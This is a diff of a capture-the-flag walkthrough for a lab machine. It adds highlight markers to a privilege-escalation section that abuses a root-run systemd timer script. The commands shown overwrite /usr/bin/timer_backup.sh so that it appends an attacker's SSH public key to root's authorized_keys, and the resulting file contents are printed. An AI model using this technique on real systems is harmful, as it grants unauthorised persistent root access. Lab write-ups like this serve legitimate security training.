@@ -129,7 +129,7 @@ Wants=timer_backup.timer
 WantedBy=multi-user.target
 
 [Service]
-ExecStart=/usr/bin/systemctl restart web_backup.service
+@@@ExecStart=/usr/bin/systemctl restart web_backup.service@@@
 {% endhighlight %}
 
 We can execute `systemctl cat web_backup.service` to see how the `web_backup.service` service is configured. From the output, shown below, we can see that the service executes the command `/bin/bash /usr/bin/timer_backup.sh` when it is started. Since we know that this service is restarted every 10 seconds, we know that the `/usr/bin/timer_backup.sh` script is executed every 10 seconds as well. We also know that it is executed by `root` since no user was explicitly stated in the services' configurations and the default user for systemd tasks is `root`.
@@ -139,7 +139,7 @@ We can execute `systemctl cat web_backup.service` to see how the `web_backup.ser
 Description=Creates backups of the website
 
 [Service]
-ExecStart=/bin/bash /usr/bin/timer_backup.sh
+@@@ExecStart=/bin/bash /usr/bin/timer_backup.sh@@@
 {% endhighlight %}
 
 ![timerBackup](/assets/{{ imgDir }}/timerBackup.png)
@@ -154,12 +154,11 @@ echo 'mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ssh/authorized_keys' 
 Then, we execute the command above to place the command `mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ss h/authorized_keys` in the `timer_backup.sh` file. This command creates a `.ssh` directory in the `root` user's home directory and adds our public key to a file named "authorized_keys" in this directory. Note that `[id_rsa.pub]` should be the content of the `id_rsa.pub` file we generated earlier, as demonstrated below.
 
 {% highlight none linenos %}
-pericles@time:/var/www/html$ echo 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
+pericles@time:/var/www/html$ @@echo 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh@@
 <ot/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
-pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh
+pericles@time:/var/www/html$ @@cat /usr/bin/timer_backup.sh@@
 cat /usr/bin/timer_backup.sh
-mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys
-pericles@time:/var/www/html$
+@@@mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys@@@
 {% endhighlight %}
 
 ![rootSSH](/assets/{{ imgDir }}/rootSSH.png)
